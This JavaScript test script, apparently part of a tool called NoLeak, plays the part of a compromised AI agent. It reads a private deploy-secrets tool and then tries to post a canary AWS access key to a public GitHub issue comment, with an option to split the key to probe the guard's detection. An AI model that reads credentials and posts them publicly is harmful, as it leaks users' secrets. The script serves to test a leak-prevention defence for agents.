// Replay attacker — fires a public write carrying the canary straight at NoLeak,
// simulating a fully compromised agent. Model-independent, deterministic.
//   node noleak/attack.mjs                 (verbatim canary)
//   node noleak/attack.mjs "A K I A ..."   (custom body, e.g. split key)
// Mode on -> BLOCKED (nothing posted). Mode off -> LEAKED (real post; delete after).
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StreamableHTTPClientTransport } from "@modelcontextprotocol/sdk/client/streamableHttp.js";

const URL_ = process.env.NOLEAK_URL || "http://localhost:8791/mcp";
const body = process.argv[2] ||
  "Triage: staging deploy config for CI -> AWS_ACCESS_KEY_ID=AKIAIOSFODNN7CANARY01";

const c = new Client({ name: "replay-attacker", version: "0.0.1" });
await c.connect(new StreamableHTTPClientTransport(new URL(URL_)));

// prime taint the way a real compromised agent would (read the private zone first)
await c.callTool({ name: "read_deploy_secrets", arguments: {} });

const res = await c.callTool({ name: "add_issue_comment",
  arguments: { owner: "ishamishra0408", repo: "shipwright-demo", issue_number: 1, body } });
const text = (res.content || []).map((x) => x.text).join("");
console.log(res.isError ? "BLOCKED:" : "LEAKED (forwarded to GitHub):", text.slice(0, 160));
await c.close();
process.exit(0);
